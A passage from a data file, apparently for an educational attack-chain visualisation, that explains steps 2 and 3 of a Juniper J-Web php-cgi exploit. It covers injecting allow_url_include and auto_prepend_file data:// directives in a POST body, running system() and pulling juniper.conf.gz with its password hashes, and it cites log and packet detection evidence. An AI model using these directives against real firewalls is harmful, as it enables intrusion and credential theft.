        plainTitle: 'Supplying `allow_url_include=1` & `auto_prepend_file="data://..."` in the POST Body',
        storyAnalogy:
          'When `php-cgi` opens `/dev/fd/0` thinking it is `php.ini`, it reads the attacker’s POST body: `allow_url_include=1` and `auto_prepend_file="data://text/plain;base64,..."`.',
        simpleExplanation:
          'As php-cgi initializes before executing webauth_operation.php, it opens /dev/fd/0 and parses the attacker’s HTTP POST body as php.ini directives. Inside that body, the attacker writes allow_url_include=1 (unlocking PHP’s ability to execute code directly from inline data:// URLs) and auto_prepend_file="data://text/plain;base64,PD9waHAg..." (instructing PHP to automatically decode and run that base64 PHP script in memory before running the requested page).',
        howItWorksInPractice:
          'Because both the fake php.ini (/dev/fd/0) and the prepended PHP script (data://text/plain;base64,...) exist strictly in memory streams, zero files are ever created in /var/tmp/ on the firewall.',
        diagramAlignment:
          'On the diagram, arrow #2.1→ parses `/dev/fd/0` inside Node ④ (`php-cgi` Runtime), and ⇠#2.2 loads the inline `data://` PHP payload.',
        detectionAndEvidence:
          'Documented by VulnCheck: Network packet inspection showing `allow_url_include` and `auto_prepend_file` inside HTTP POST bodies to J-Web.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1059.004',
        plainTitle: 'Executing In-Memory PHP `system()` & Exfiltrating `/config/juniper.conf.gz`',
        storyAnalogy:
          'The prepended PHP payload runs `system()` to grab the firewall’s master configuration (`/config/juniper.conf.gz`) and calls `die()` so the stolen data is sent right back in the HTTP 200 response.',
        simpleExplanation:
          'When php-cgi executes the prepended data:// stream, the attacker’s PHP code invokes system or passthru to run FreeBSD shell commands on the Junos device (such as extracting /config/juniper.conf.gz — which contains all firewall rules, VPN pre-shared keys, and $9$ or SHA-512 administrator password hashes — and terminating the PHP script so the command output is returned cleanly in the HTTP response).',
        howItWorksInPractice:
          'In Junos OS, passwords encrypted with the reversible `$9$` format inside `juniper.conf` can be instantly decrypted offline using known Junos `$9$` decoding scripts.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ executes `/bin/sh` on Node ⑤ (Junos Config & Shell) while Node ⑥ (SIEM) alerts on `php-cgi` spawning `/bin/sh`.',
        detectionAndEvidence:
          'Documented in Juniper JSA72300 & CISA KEV: `/var/log/httpd.log` entries for `/webauth_operation.php` and `php-cgi` spawning `/bin/sh` or `/usr/sbin/cli`.',
      },
    ],
  },
};
